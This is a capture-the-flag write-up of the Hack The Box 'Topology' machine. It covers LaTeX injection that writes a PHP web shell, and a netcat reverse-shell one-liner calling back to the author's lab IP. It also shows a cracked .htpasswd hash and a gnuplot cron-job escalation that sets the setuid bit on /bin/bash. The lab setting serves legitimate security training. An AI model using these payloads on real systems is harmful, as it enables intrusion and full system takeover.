![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/8b83c2bf-8781-4bea-9114-c1f666d236c4)

> IMPORTANT: The method I used in this writeup was patched shortly after I wrote it. Will need to come back later and update my method.
> I feel this box is fairly unrealistic. Not a fan.

# Enumeration
Nmap:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/67848de5-0c46-4725-9d81-392fac2187bf)

22 - ssh, not interesting
80 - http, likely point of entry

Checking out the website, it’s a landing page for a university type thing. 
The website has a lot of information on the home page which could be used for generating a wordlist. There are also an email which could give us a username: lklein@topology.htb

Based on that layout, we can also include other likely usernames: 
Vdaisley
dabrahams

Looking deeper on the website, there is  a link to a subdomain: latex.topology.htb

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/189762a1-c16b-493f-85a3-a8b7f5ae3e0e)

# Foothold
Played with the program for a bit. It uses a language called LaTeX which turns a specific input into equations. There are ways to inject code to read files and such, but the author of this box blacklists a bunch of useful commands… Checking the forum about it, people are suggesting reading this paper: https://www.usenix.org/system/files/login/articles/73506-checkoway.pdf

Took a lot of digging, but you can ignore the illegal commands portion. I just needed to find the right command and method that would allow me to write a file to the webpage. 
Turns out the root webpage is a readable directory. Under that directory there is another directory under latex.topology.htb/tempfiles/
This is where I can write to.
In burpsuite’s repeater, I can highlight the vulnerable input 

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/91f7dda6-b6f1-4196-91e7-c7eab657b833)

And this will pop up with the inspector on the right:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/906723c8-ead3-4de7-8484-8a5666e8b122)

I can make changes to the “Decoded from” section and apply changes so that I can not worry about spaces or encoding!
I decided to try chatgpt for a bit to see if LaTeX will let me write external files from LaTeX:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/238f4e20-e87d-4d1f-8259-cf9597de8d45)

Based on this, I should be able to tell it to write a php script for me and send it through. I just need it to run commands… 

Here is the script that works
```
\begin{filecontents*}[overwrite]{test.php}
<?php system($_GET["cmd"]);?>
/end{filecontents*}
```

This will create a php file in that directory. From here I can add ‘?cmd=whoami’ to the end of the url and it will run the whoami command!

Now I need to craft a way to get a shell!
I’ll use this code and send it to that page in the repeater using the same method:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 1234 >/tmp/f
```

Now we test!
```
$ whoami
www-data
```
Success!

I can’t get into the user folders since I’m only www-data, so let’s look around. Looking in /var/www/ I find a few subdomains:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/d66b635b-9d15-419f-87a9-6b5fd7d9f824)

We already knew about latex so let’s add these to the /etc/hosts file and keep exploring!

When I go to dev.topology.htb I’m greeted with a login screen. Okay… Maybe there’s something interesting in the dev folder?
There is! A hidden file to be exact:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/2b2431aa-0d99-4738-918f-a42b2a23f601)

Neat!
The .htpasswd has a has for the user vdaisley
```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

Time to point hashcat at it!

The hash is in apache which should be mode 1600… Now we wait!
We got a winner: 
Vdaisley : calculus20

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/1e8fa574-b9bc-4058-96ee-84d174937465)

That’s ssh! Let’s go!!!

Now for root. 

# Escalation
From what I can tell, there is a folder that I can write to, but don’t have permission to read: /opt/gnuplot/

There may be something to this…

Poking a bit further, I can run a tool called pspy64 to check running processes and I see something interesting happening every so often:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/205e6001-db6a-4b90-bc3b-93273448ff8c)

That command is telling it to search that folder for anything ending in .plt and then run it in gnuplot. And since this owned by root, that is likely my way in. 

I created the following file named root.plt and placed it in the /opt/gnuplot directory:
```
#!/bin/bash
`chmod u+s /bin/bash
```

The back quote is important. That tells gnuplot to run it as a system command. Once this task runs, it should change the bash program into a setuid binary:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/104740d7-77f7-4dae-b524-cb6626d1af46)

Topology has been PWNED!

# Update
The creator patched the method I used above. You can nolonger write to the computer. You need to get in by reading files. This box’s foothold is now entirely dependant on enumerating the box more. Based on the forum posts, I need to read single lines from files to find the hash and get in. To do this, I need to know there is more than one domain:
I can brute force domain discovery with this command: 
`gobuster vhost -u http://topology.htb -t 50 -w /usr/share/dirb/wordlists/common.txt`
![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/0b68698d-7f96-4280-a3ec-c5c89b6fce56)

Will need to follow up on this box. Not sure what I missed since I did the non-intended method.... 
Looking at other writeups and guides, a lot of peopple used the same method I did. Will need to review the official guide when it gets released. Stay tuned... 
